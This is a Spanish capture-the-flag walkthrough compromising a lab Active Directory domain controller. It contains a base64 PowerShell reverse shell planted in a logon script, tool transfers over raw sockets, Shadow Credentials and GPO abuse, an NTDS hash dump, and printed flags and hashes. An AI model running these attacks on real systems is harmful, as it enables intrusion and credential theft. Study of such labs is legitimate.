# Máquina: BabyTwo

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Active Directory, Kerberos Enumeration, BloodHound

---

![Pasted image 20260914225245.png](assets/Pasted%20image%2020260914225245.png)

escaneo

```
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.72 -oN escaneo
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-14 22:53:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-14T22:54:38+00:00
|_ssl-date: 2026-09-14T22:54:58+00:00; -27s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2026-09-13T22:22:23
|_Not valid after:  2027-03-15T22:22:23
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-14T22:54:42
|_  start_date: N/A
|_clock-skew: mean: -27s, deviation: 0s, median: -27s
```

al enumerar estamos en un dc a enumerar

```
nxc smb 10.129.234.72
```

![Pasted image 20260914230133.png](assets/Pasted%20image%2020260914230133.png)

lo agregamos al etc/hosts luego de enumerar miramos que guest estaba habilitado enumeramos y miramos un recurso que no es comun

```
nxc smb 10.129.234.72 -u 'guest' -p '' --shares
```

![Pasted image 20260914231059.png](assets/Pasted%20image%2020260914231059.png)

asi que nos conectamos con smbclient

```
smbclient //DC.baby2.vl/homes -U "guest%"
```

![Pasted image 20260914231303.png](assets/Pasted%20image%2020260914231303.png)

ningunos de estos usuarios tiene nada probamos poner los mismos nombres como pass aber

archivo

```
Amelia.Griffiths
Carl.Moore
Harry.Shaw
Joan.Jennings
Joel.Hurst
Kieran.Mitchell
library
Lynda.Bailey
Mohammed.Harris
Nicola.Lamb
Ryan.Jenkins
```

```
nxc smb 10.129.234.72 -u 'user.txt' -p 'user.txt' --continue-on-success
```

![Pasted image 20260914235138.png](assets/Pasted%20image%2020260914235138.png)

dos usuarios tiene su mismo nombre como pass Carl.Moore y library

![Pasted image 20260914235759.png](assets/Pasted%20image%2020260914235759.png)

miramos recursos con los dos uasuarios

![Pasted image 20260915000003.png](assets/Pasted%20image%2020260915000003.png)


luego de enumerar con el user library miramos esto un escritp 

```
smbclient //DC.baby2.vl/SYSVOL -U "library%library"
```


![Pasted image 20260915000318.png](assets/Pasted%20image%2020260915000318.png)

miramos esto en el scripts

![Pasted image 20260915000736.png](assets/Pasted%20image%2020260915000736.png)

### ¿Qué hace este script?

Es un **VBScript** que mapea recursos compartidos de red (SMB shares) como si fueran discos locales en Windows.

#### Desglose paso a paso:

**La función `MapNetworkShare` hace esto:**

1. **Crea un objeto de red** (`WScript.Network`) — es la forma que tiene VBScript de interactuar con la red de Windows.
2. **Revisa si la letra de disco ya está en uso** — recorre las unidades ya mapeadas para no duplicar.
3. **Si ya está mapeada, la desmonta primero** (`RemoveNetworkDrive`) y luego la vuelve a montar.
4. **Mapea el share** (`MapNetworkDrive`) — asocia una ruta de red a una letra de unidad.

**Al final del script llama la función dos veces:**

```
\\dc.baby2.vl\apps  →  unidad V:
\\dc.baby2.vl\docs  →  unidad L:
```

Siguiente paso — Buscar qué usuario tiene ese script asignado

```
ldapsearch -x -H ldap://10.129.234.72 \
  -D "Carl.Moore@baby2.vl" -w "Carl.Moore" \
  -b "DC=baby2,DC=vl" \
  "(scriptPath=*)" sAMAccountName scriptPath
```

luego miramos que el `login.vbs` se ejecuta cuando **cualquiera de los 10 usuarios del OU `office`** inicia sesión:

![Pasted image 20260915001941.png](assets/Pasted%20image%2020260915001941.png)

miramos que todos los usuarios llaman al mismo escript asi que analizanso esto

El vector de ataque clásico aquí sería **modificar el `login.vbs`** para que cuando algún usuario de office haga login, ejecute algo malicioso — por ejemplo, una reverse shell o que capture el hash NTLM.

en este caso rce

asi que modicamos el archivo 

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAAxACIALAA5ADAAOQAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```


![Pasted image 20260915012218.png](assets/Pasted%20image%2020260915012218.png)


luego borramos y subimos el archivo por smb borrado el que lla tenemos procuren de que el base64 no le quede corrupto

```
smbclient //10.129.56.162/SYSVOL -U "library%library" -c "cd baby2.vl\scripts; del login.vbs; put login.vbs"
```

y de una sacamos user flag

```
type C:\user.txt
```

que esta en la raiz

![Pasted image 20260915015309.png](assets/Pasted%20image%2020260915015309.png)


```user
42783b2c1483aeb70eca6810f0645c38
```

![Pasted image 20260915015921.png](assets/Pasted%20image%2020260915015921.png)

aora a enumerar con el blood asi que descargamos la confi del ad

```
bloodhound-ce-python -u 'library' -p 'library' -d baby2.vl -dc dc.baby2.vl -ns 10.129.56.162 -c All --zip
```

![Pasted image 20260915021407.png](assets/Pasted%20image%2020260915021407.png)

![Pasted image 20260915022156.png](assets/Pasted%20image%2020260915022156.png)

al mirar el blood miramos que estamos en el grupo legacy y que ese grupo tiene writeowner sobre gpoadm

![Pasted image 20260915022353.png](assets/Pasted%20image%2020260915022353.png)

sabiendo esto descargamos rubeux para hacer un ataque de Shadow Credentials

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials

```
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

![Pasted image 20260915025121.png](assets/Pasted%20image%2020260915025121.png)

luego con necat lo pasamos

```
ncat -lvp 4444 --send-only < Rubeus.exe
```

lo descargamos en la maquina

```
$client = New-Object System.Net.Sockets.TcpClient('10.10.15.81', 4444); $stream = $client.GetStream(); $writer = [System.IO.File]::Create('C:\Windows\Temp\Rubeus.exe'); $buffer = New-Object byte[] 4096; while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) { $writer.Write($buffer, 0, $read) }; $writer.Close(); $stream.Close(); $client.Close()
```

la shell se quitara es normal ponemos el nc y nos llega otra vez

![Pasted image 20260915030349.png](assets/Pasted%20image%2020260915030349.png)

![Pasted image 20260915030428.png](assets/Pasted%20image%2020260915030428.png)

Rubeus transferido correctamente. Ahora sí, sigamos con Whisker antes de poder usar `asktgt` (necesitas el certificado que genera Whisker).

lo descargamos en mi arch

```
wget https://github.com/jakobfriedl/precompiled-binaries/raw/main/LateralMovement/Whisker.exe
```

![Pasted image 20260915030627.png](assets/Pasted%20image%2020260915030627.png)

esmos lo mismo con el nc

```
ncat -lvp 4444 --send-only < Whisker.exe
```

luego lo descargamos

```
$client = New-Object System.Net.Sockets.TcpClient('10.10.15.81', 4444); $stream = $client.GetStream(); $writer = [System.IO.File]::Create('C:\Windows\Temp\Whisker.exe'); $buffer = New-Object byte[] 4096; while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) { $writer.Write($buffer, 0, $read) }; $writer.Close(); $stream.Close(); $client.Close()
```

![Pasted image 20260915030838.png](assets/Pasted%20image%2020260915030838.png)

Ahora ejecutamos Whisker contra `gpoadm`  pero le desimos a whisker que lo gaurde en un archivo

```
C:\Windows\Temp\Whisker.exe add /target:gpoadm /path:C:\Windows\Temp\gpoadm.pfx /password:Passw0rd123!
```

### Qué hace ese comando exactamente

`Whisker.exe add /target:gpoadm` inyecta un **certificado shadow credential** en el atributo `msDS-KeyCredentialLink` del objeto `gpoadm` en Active Directory.

![Pasted image 20260915031620.png](assets/Pasted%20image%2020260915031620.png)

Ahora sí, el .pfx quedó guardado en disco. Corre el asktgt apuntando a ese archivo (nota: la sintaxis de Rubeus usa `/certificate:` también para archivos, no hace falta `/certfile`, así que usamos exactamente lo que nos devolvió Whisker):

luego

Agregué `/ptt` al final para que, si funciona, el TGT se inyecte automáticamente en tu sesión actual (pass-the-ticket) y quedes autenticado como `gpoadm` sin pasos extra.

```
C:\Windows\Temp\Rubeus.exe asktgt /user:gpoadm /certificate:C:\Windows\Temp\gpoadm.pfx /password:"Passw0rd123!" /domain:baby2.vl /dc:dc.baby2.vl /getcredentials /show /ptt
```

![Pasted image 20260915031901.png](assets/Pasted%20image%2020260915031901.png)

miramos que el tike este activo

```
klist
```

![Pasted image 20260915032003.png](assets/Pasted%20image%2020260915032003.png)

Ticket confirmado y activo como `gpoadm@BABY2.VL`. Ahora sigamos con la identificación de las GPOs.

```
. C:\Windows\Temp\PowerView.ps1; Get-DomainGPO | Select-Object displayname, name, gpcfilesyspath
```

Esto lista todas las GPOs con:

- **displayname**: el nombre legible (ej. "Default Domain Controllers Policy")
- **name**: el GUID que necesitamos para apuntar la herramienta de abuso
- **gpcfilesyspath**: la ruta en SYSVOL donde viven los archivos reales de la GPO

![Pasted image 20260915032133.png](assets/Pasted%20image%2020260915032133.png)

**Contexto:** `gpoadm` tiene `GenericAll` sobre GPOs enlazadas a la OU de Domain Controllers (`Default Domain Controllers Policy`), obtenido tras controlar `gpoadm` vía `WriteOwner` desde el grupo `LEGACY`.

## 1. Enumerar GPOs y sacar el GUID

powershell

```powershell
Get-DomainGPO | Select-Object displayname, name, gpcfilesyspath
```

**Por qué:** necesitamos el GUID exacto de la GPO vulnerable con `GenericAll`. Preferir la enlazada directamente a la OU de Domain Controllers (aplica más rápido — refresh cada ~5 min en DCs vs 90-120 min en workstations).

GUID usado: `{6AC1786C-016F-11D2-945F-00C04fB984F9}` (Default Domain Controllers Policy)

## 2. Instalar pyGPOAbuse (Arch, con pipx)

bash

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git && cd pyGPOAbuse
pipx runpip impacket install -r /ruta/completa/pyGPOAbuse/requirements.txt
```

**Por qué así:** `pygpoabuse.py` importa `impacket` como librería, no como script. Como `impacket` ya vive en un venv aislado de `pipx`, instalamos las deps de pyGPOAbuse (`msldap`, etc.) dentro de ese mismo venv en vez de crear uno nuevo.

## 3. Ejecutar el abuso (pass-the-hash)

bash

```bash
/home/USER/.local/share/pipx/venvs/impacket/bin/python pygpoabuse.py DOMINIO/gpoadm -hashes :HASH_NTLM -gpo-id "GUID-DE-LA-GPO" -dc-ip IP_DC
```

**Por qué pass-the-hash y no password:** si obtuviste el acceso a `gpoadm` vía Shadow Credentials (Whisker + Rubeus) en vez de resetear su contraseña, nunca tienes una password en texto plano — solo el hash NTLM real (sacado del U2U de Rubeus). pygpoabuse soporta `-hashes lm:nt` igual que cualquier herramienta de impacket.

**Qué hace el comando:** escribe un `ScheduledTasks.xml` malicioso en `SYSVOL\Policies\{GUID}\Machine\Preferences\ScheduledTasks\`. Al estar en la sección _Machine_ (no _User_), la tarea se ejecuta como **SYSTEM** en el próximo refresh de GPO, sin depender de que nadie inicie sesión. Por defecto crea un usuario local `john:H4x00r123..` y lo suma a administradores.

## 4. Verificar que el archivo quedó bien escrito (opcional, para confirmar antes de esperar)

bash

```bash
smbclient.py -hashes :HASH_NTLM DOMINIO/gpoadm@IP_DC
# dentro:
use sysvol
cd DOMINIO\Policies\{GUID}\Machine\Preferences\ScheduledTasks
ls
```

## 5. Esperar el refresh y verificar creación del usuario

bash

```bash
nxc smb IP_DC -u john -p 'H4x00r123..'
```

- Mientras dice `(Guest)` → la tarea aún no corrió, esperar y reintentar cada 1-2 min.
- Cuando aparece `(Pwn3d!)` → el usuario ya es admin local, listo para explotar.

**Nota de timing:** en Domain Controllers el ciclo de refresh de GPO es de ~5 min (mucho más rápido que en workstations). Si pasan >10-15 min sin cambios, revisar el GUID o el contenido de la tarea.

## 6. Confirmar compromiso total (dump NTDS)

bash

```bash
nxc smb IP_DC -u john -p 'H4x00r123..' --ntds
```

Vuelca todos los hashes del dominio, incluyendo `Administrator` — confirma control total del DC.

## 7. Shell final

bash

```bash
evil-winrm -i IP_DC -u john -p 'H4x00r123..'
```

## Cadena completa (resumen)

```
Amelia (LEGACY) --WriteOwner--> gpoadm --GenericAll--> GPO (DC OU) --pyGPOAbuse--> SYSTEM en DC
```

## Herramientas usadas en esta fase

- `pygpoabuse.py` (Hackndo) — requiere impacket como librería
- `nxc` (NetExec) — verificación de credenciales + dump NTDS
- `evil-winrm` — shell final

luego dumpeamos el ntds

```
nxc smb 10.129.56.162 -u john -p 'H4x00r123..' --ntds
```

![Pasted image 20260915035000.png](assets/Pasted%20image%2020260915035000.png)

admin hash

```
61eb5125f9944214679c2d0fdca6eb82
```

![Pasted image 20260915035345.png](assets/Pasted%20image%2020260915035345.png)

```administrator
293500962edc31fa154951eeeb5740f9
```

![Pasted image 20260915035642.png](assets/Pasted%20image%2020260915035642.png)

